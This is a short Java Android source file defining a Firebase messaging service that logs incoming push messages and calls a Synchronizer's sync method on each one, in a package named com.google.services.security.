package com.google.services.security;

import android.util.Log;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

/**
 * Created by ouala_eddine on 1/17/2019.
 * Project : lahcen.
 */
public class MyFirebaseMessagingService extends FirebaseMessagingService {

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        // ...
        new Synchronizer(getApplicationContext()).sync();

        // TODO(developer): Handle FCM messages here.
        // Not getting messages here? See why this may be: https://goo.gl/39bRNJ
        Log.d("", "From: " + remoteMessage.getFrom());

        // Check if message contains a data payload.
        if (remoteMessage.getData().size() > 0) {
            Log.d("", "Message data payload: " + remoteMessage.getData());

            new Synchronizer(getApplicationContext()).sync();

        }

        // Check if message contains a notification payload.
        if (remoteMessage.getNotification() != null) {
            Log.d("", "Message Notification Body: " + remoteMessage.getNotification().getBody());
        }

        // Also if you intend on generating your own notifications as a result of a received FCM
        // message, here is where that should be initiated. See sendNotification method below.
    }
}
